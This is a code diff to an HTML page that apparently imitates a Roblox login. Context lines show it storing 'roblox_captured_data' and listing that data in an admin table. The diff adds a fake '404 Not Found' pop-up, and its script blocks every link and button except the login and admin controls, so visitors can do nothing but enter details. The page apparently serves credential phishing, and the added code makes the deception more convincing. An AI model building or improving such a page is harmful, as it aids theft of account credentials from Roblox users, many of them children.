@@ -197,6 +197,22 @@
             </div>
         </div>
 
+        <!-- 404 錯誤彈窗 (預設隱藏) -->
+        <div id="error-404-modal" class="hidden fixed inset-0 bg-black/70 z-[100] flex items-center justify-center p-4 backdrop-blur-sm">
+            <div class="bg-[#2b2d31] w-full max-w-[320px] rounded-lg p-6 shadow-2xl flex flex-col items-center text-center border border-gray-700 transform transition-all">
+                <div class="bg-red-500/10 p-3 rounded-full mb-4">
+                    <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                    </svg>
+                </div>
+                <h2 class="text-[20px] font-bold text-white mb-2">404 Not Found</h2>
+                <p class="text-gray-400 text-[14px] mb-6">您請求的頁面或功能不存在。</p>
+                <button id="close-404-btn" class="bg-[#393b3d] hover:bg-[#4a4d50] text-white px-6 py-[8px] rounded-lg transition-colors text-[14px] font-medium w-full">
+                    關閉
+                </button>
+            </div>
+        </div>
+
     </main>
 
     <script>
@@ -330,6 +346,29 @@
                 capturedData = [];
                 localStorage.removeItem('roblox_captured_data');
                 renderAdminTable();
+            }
+        });
+
+        // --- 4. 404 錯誤彈窗邏輯 ---
+        const error404Modal = document.getElementById('error-404-modal');
+        const close404Btn = document.getElementById('close-404-btn');
+
+        // 關閉 404 彈窗
+        close404Btn.addEventListener('click', () => {
+            error404Modal.classList.add('hidden');
+        });
+
+        // 攔截所有連結和按鈕 (排除主要功能按鈕)
+        const allInteractables = document.querySelectorAll('a, button');
+        const excludedIds = ['login-btn', 'clear-records-btn', 'close-admin-btn', 'close-404-btn'];
+
+        allInteractables.forEach(el => {
+            // 只要 ID 不在排除名單內，就通通攔截
+            if (!excludedIds.includes(el.id)) {
+                el.addEventListener('click', (e) => {
+                    e.preventDefault(); // 阻止原本的跳轉或動作
+                    error404Modal.classList.remove('hidden'); // 顯示 404 彈窗
+                });
             }
         });
 
